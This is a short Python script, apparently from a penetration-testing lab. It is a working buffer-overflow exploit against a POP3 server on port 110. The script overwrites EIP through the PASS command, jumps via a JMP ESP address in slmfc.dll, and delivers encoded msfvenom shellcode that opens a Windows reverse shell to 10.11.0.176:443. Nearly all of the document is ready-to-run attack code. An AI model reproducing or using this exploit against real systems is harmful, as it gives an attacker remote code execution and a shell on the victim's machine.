#1/usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#msfvenom --payload windows/shell_reverse_tcp LHOST=10.11.0.176 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d'
#x86/shikata_ga_nai chosen with final size 351
#Final size of c file: 1500 bytes
shellcode = ("\xbb\xb5\x67\x24\x18\xd9\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x83\xee\xfc\x31\x5e\x0e\x03\xeb\x69\xc6\xed\xef\x9e\x84"
"\x0e\x0f\x5f\xe9\x87\xea\x6e\x29\xf3\x7f\xc0\x99\x77\x2d\xed"
"\x52\xd5\xc5\x66\x16\xf2\xea\xcf\x9d\x24\xc5\xd0\x8e\x15\x44"
"\x53\xcd\x49\xa6\x6a\x1e\x9c\xa7\xab\x43\x6d\xf5\x64\x0f\xc0"
"\xe9\x01\x45\xd9\x82\x5a\x4b\x59\x77\x2a\x6a\x48\x26\x20\x35"
"\x4a\xc9\xe5\x4d\xc3\xd1\xea\x68\x9d\x6a\xd8\x07\x1c\xba\x10"
"\xe7\xb3\x83\x9c\x1a\xcd\xc4\x1b\xc5\xb8\x3c\x58\x78\xbb\xfb"
"\x22\xa6\x4e\x1f\x84\x2d\xe8\xfb\x34\xe1\x6f\x88\x3b\x4e\xfb"
"\xd6\x5f\x51\x28\x6d\x5b\xda\xcf\xa1\xed\x98\xeb\x65\xb5\x7b"
"\x95\x3c\x13\x2d\xaa\x5e\xfc\x92\x0e\x15\x11\xc6\x22\x74\x7e"
"\x2b\x0f\x86\x7e\x23\x18\xf5\x4c\xec\xb2\x91\xfc\x65\x1d\x66"
"\x02\x5c\xd9\xf8\xfd\x5f\x1a\xd1\x39\x0b\x4a\x49\xeb\x34\x01"
"\x89\x14\xe1\x86\xd9\xba\x5a\x67\x89\x7a\x0b\x0f\xc3\x74\x74"
"\x2f\xec\x5e\x1d\xda\x17\x09\x28\x10\x17\x79\x44\x24\x17\x78"
"\x2e\xa1\xf1\x10\x40\xe4\xaa\x8c\xf9\xad\x20\x2c\x05\x78\x4d"
"\x6e\x8d\x8f\xb2\x21\x66\xe5\xa0\xd6\x86\xb0\x9a\x71\x98\x6e"
"\xb2\x1e\x0b\xf5\x42\x68\x30\xa2\x15\x3d\x86\xbb\xf3\xd3\xb1"
"\x15\xe1\x29\x27\x5d\xa1\xf5\x94\x60\x28\x7b\xa0\x46\x3a\x45"
"\x29\xc3\x6e\x19\x7c\x9d\xd8\xdf\xd6\x6f\xb2\x89\x85\x39\x52"
"\x4f\xe6\xf9\x24\x50\x23\x8c\xc8\xe1\x9a\xc9\xf7\xce\x4a\xde"
"\x80\x32\xeb\x21\x5b\xf7\x1b\x68\xc1\x5e\xb4\x35\x90\xe2\xd9"
"\xc5\x4f\x20\xe4\x45\x65\xd9\x13\x55\x0c\xdc\x58\xd1\xfd\xac"
"\xf1\xb4\x01\x02\xf1\x9c")

#A up until EIP
#send EIP to a JMP ESP instruction in slmfc.dll
#8 bytes of nop
#lastly, out 351 byte shellcode
buffer = 'A' * 2606  + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode


try:
    print "Sending evil buffer..."
    s.connect(('10.11.23.10', 110))
    data = s.recv(1024)
    s.send('USER username + \r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!'
except:
    print 'something went wrong'
